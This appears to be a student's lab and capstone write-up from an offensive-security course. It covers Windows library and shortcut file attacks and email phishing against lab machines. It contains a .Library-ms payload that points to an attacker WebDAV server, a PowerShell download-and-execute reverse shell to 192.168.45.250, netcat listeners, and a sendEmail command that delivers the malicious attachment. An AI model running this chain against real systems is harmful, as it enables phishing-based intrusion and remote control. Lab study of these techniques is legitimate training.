1. Follow the steps in this section to get code execution on the _HR137_ (VM Group 1 - VM #2) system by using library and shortcut files. Be aware that after every execution of a **.lnk** file from the WebDAV share, the library file from the SMB share will be removed. You can find the flag on the desktop of the _hsmith_ user. You can use VM #1 of VM Group 1 to build the library file and shortcut.

```bash
# VM #1: 192.168.223.194
# VM #2: 192.168.223.195

# Connecting via FreeRDP
xfreerdp /v:192.168.223.194 /u:offsec /p:lab /dynamic-resolution /drive:/usr/share/Kali,.
# Full payload in .Library-ms file
```
```xml

<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
    <name>@windows.storage.dll,-34582</name>
    <version>6</version>
    <isLibraryPinned>true</isLibraryPinned>
    <iconReference>imageres.dll,-1003</iconReference>
    <templateInfo>
        <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
    </templateInfo>
    <searchConnectorDescriptionList>
        <searchConnectorDescription>
            <isDefaultSaveLocation>true</isDefaultSaveLocation>
            <isSupported>false</isSupported>
            <simpleLocation>
                <url>http://192.168.45.250</url>
            </simpleLocation>
        </searchConnectorDescription>
    </searchConnectorDescriptionList>
</libraryDescription>
```
```bash
# PS command
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.250:8000/powercat.ps1');
powercat -c 192.168.45.250 -p 4444 -e powershell"

# Running python server
python -m http.server 8000
nc -lvnp 4444

# Push a command via SMB to a distant system
smbclient //192.168.223.195/share -c 'put config.Library-ms'

# Our "config" file is read, and opened ;)
```
![[Pasted image 20250317192750.png]]

3. **Capstone Lab**: Enumerate the _ADMIN_ (VM Group 2 - VM #4) machine and find a way to leverage Windows library and shortcut files to get code execution. Obtain a reverse shell and find the flag on the desktop for the _Administrator_ user. You can use VM #3 of VM Group 2 to prepare your attack.

```bash
# VM #3: 192.168.223.194
# VM #4: 192.168.223.199

# Enumeration
sudo nmap -sV -sC -v 192.168.223.199
	# OS: Windows
	# 80: HTTP
	# Mail Server running (25, 110 (POP3), 143 (IMAP), 587)
	# 5985: HTTP
	# 445: SMB
	# 135 & 139: RPC & NetBios

# Nothing found on the HTTP websites. Trying to send an email directly

# Getting more info on the SMTP server
ls /usr/share/nmap/scripts/ | grep smtp
	# Found a smtp-ntlm-info.nse script

# Running it
sudo nmap -sV -p 25 --script "smtp-enum-users" 192.168.223.199

# Trying different bruteforce directory attacks on the web servers
gobuster dir -u http://192.168.223.199:80 -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://192.168.223.199:5985 -w /usr/share/wordlists/dirb/common.txt
	# Nothing found, trying to go on the email route again

# This SMTP command takes years
nmap --script smtp-* -p 25,465,587 192.168.223.199
	# Nothing found again :(

# Trying the smb server
nmap --script smb-enum-* -p 445 192.168.223.199
	# Nothing

# Trying pop3
ls /usr/share/nmap/scripts/ | grep pop
nmap --script pop3-capabilities -p 110 192.168.223.199
	# Nothing

# Trying to send an email directly
swaks --to info@192.168.223.199 --from local-user@192.168.45.250 --server 192.168.223.199 --header "Subject: test" --body "hello"
	# Nope

# Connecting to the email server directly 
telnet 192.168.223.199 25
	
# With anohter tool
sendEmail -t info@192.168.223.199 -f techsupport@bestcomputers.com -s 192.168.223.199 -u "Important Upgrade Instructions"
	# Neither
	
# Trying a better gobuster
gobuster dir -u 192.168.223.199 -w /usr/share/wordlists/dirb/common.txt -t 10 -x pdf
	# Found info.pdf

# Finding meta data
exiftool -a -u info.pdf
	# Found a user called Dave Wizard

# Reading the PDF, they say emails are firstname.lastname@supermagicorg.com
# They also mention a test@supermagicorg.com user with password test

# Trying to send email again
sendEmail -t test@supermagicorg.com -f techsupport@bestcomputers.com -s 192.168.223.199 -u "Important Upgrade Instructions" -a jaja.txt
	# Seems like it works!

# Sending an email, with attachment, using the test user we foud earlier
sendEmail -t dave.wizard@supermagicorg.com -f test@supermagicorg.com -s 192.168.223.199 -u "Important Upgrade Instructions" -a config.Library-ms -o message-file=mail-content.txt username=test@supermagicorg.com password=test

# At some point, they open the email and the attachment ;)
```